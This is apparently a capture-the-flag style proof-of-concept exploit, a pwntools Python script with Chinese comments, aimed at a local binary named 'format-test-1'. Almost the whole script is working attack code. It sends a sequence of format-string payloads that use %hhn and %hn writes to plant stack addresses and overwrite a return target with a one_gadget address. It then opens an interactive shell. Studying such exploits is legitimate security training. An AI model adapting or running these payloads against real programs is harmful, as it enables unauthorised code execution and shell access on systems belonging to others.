#!/usr/bin/env python
# encode:utf-8
from pwn import *


context(arch = 'amd64', os = 'linux')
def poc():
    p = process('./format-test-1')
    
    sleep(1)

    #注入循环scanf的地址
    payload_1 = "%160c%15$hhnaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\xe8\xdb\xff\xff\xff\x7f"
    p.sendline(payload_1)
    sleep(0.1)
    

    #注入\x00
    payload_2 = "%160c%15$hhnaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"
    p.sendline(payload_2)
    sleep(0.1)



    #注入第一个地址
    payload_3 = "%160c%15$hhnaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\x08\xe0\xff\xff\xff\x7f"
    p.sendline(payload_3)
    sleep(0.1)


    #注入\x00
    payload_4 = "%160c%15$hhnaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"
    p.sendline(payload_4)
    sleep(0.1)
    
    #注入第二个地址 \x09-\x0d无法写入
    payload_5 = "%160c%15$hhnaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\xff\xe0\xff\xff\xff\x7f"
    p.sendline(payload_5)
    sleep(0.1)
    

    #修改\xff为\x09，这步不一定有，完全看运气了
    payload_tmp_1 = "%160c%15$hhnaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"
    p.sendline(payload_tmp_1)
    sleep(0.1)
    
    payload_tmp_2 = "%160c%15$hhnaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\x28\xdc\xff\xff\xff\x7f"
    p.sendline(payload_tmp_2)
    sleep(0.1)
    
    payload_tmp_3 = "%9c%12$hhn%151c%15$hhn"
    p.sendline(payload_tmp_3)
    sleep(0.1)
    
    #修改程one_gadget地址
    payload_6 = '%171c%14$hhn%60084c%13$hn'
    #payload_6 = "%14$lx.%13$lx"
    p.sendline(payload_6)
    p.interactive()

    #print(p.recv())

if __name__ == '__main__':
    poc()